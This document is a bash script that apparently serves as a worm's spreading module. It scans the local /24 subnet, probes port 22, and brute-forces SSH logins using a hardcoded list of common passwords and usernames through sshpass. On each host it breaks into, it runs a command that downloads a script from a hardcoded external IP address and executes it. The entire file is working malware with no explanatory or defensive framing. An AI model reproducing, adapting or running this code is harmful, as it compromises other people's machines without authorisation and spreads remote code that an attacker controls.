commandforlinux="curl -s -o doai.sh http://107.173.101.73/doai.sh && bash doai.sh"

passwords=("root" "!@" "wubao" "password" "123456" "admin" "12345" "1234" "p@ssw0rd" "123" "1" "jiamima" "test" "root123" "!" "!q@w" "!qaz@wsx" "idc!@" "admin!@" "" "alpine" "qwerty" "12345678" "111111" "123456789" "1q2w3e4r" "123123" "default" "1234567" "qwe123" "1qaz2wsx" "1234567890" "abcd1234" "000000" "user" "toor" "qwer1234" "1q2w3e" "asdf1234" "redhat" "1234qwer" "cisco" "12qwaszx" "test123" "1q2w3e4r5t" "admin123" "changeme" "1qazxsw2" "123qweasd" "q1w2e3r4" "letmein" "server" "root1234" "master" "abc123" "rootroot" "a" "system" "pass" "1qaz2wsx3edc" "p@$$w0rd" "112233" "welcome" "!QAZ2wsx" "linux" "123321" "manager" "1qazXSW@" "q1w2e3r4t5" "oracle" "asd123" "admin123456" "ubnt" "123qwe" "qazwsxedc" "administrator" "superuser" "zaq12wsx" "121212" "654321" "ubuntu" "0000" "zxcvbnm" "root@123" "1111" "vmware" "q1w2e3" "qwerty123" "cisco123" "11111111" "pa55w0rd" "asdfgh" "11111" "123abc" "asdf" "centos" "888888" "54321" "password123" "Administrator")
usernames=("root" "system" "admin" "user" "ubuntu" "postgres" "ftp" "oracle" "mysql")

if ! command -v sshpass &> /dev/null; then
    if command -v apt-get &> /dev/null; then
        apt update
        apt-get install -y sshpass
    elif command -v yum &> /dev/null; then
        yum update
        yum install -y sshpass
    else
        exit 1
    fi
fi

internal_ip=$(ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1')
network_segment=$(echo "$internal_ip" | cut -d '.' -f 1-3)

for ((i=1; i<=255; i++))
do
    ip_address="$network_segment.$i"
    ping -c 1 -W 1 "$ip_address" >/dev/null 2>&1
    if [ $? -eq 0 ]; then
        exec 3<>/dev/tcp/"$ip_address"/22
        if [ $? -eq 0 ]; then
            for pass in "${passwords[@]}"
            do
                for user in "${usernames[@]}"
                do
                    sshpass -p "$pass" ssh $user@$ip_address -p 22 $commandforlinux
                done
            done
        fi
    else
        echo ""
    fi
done
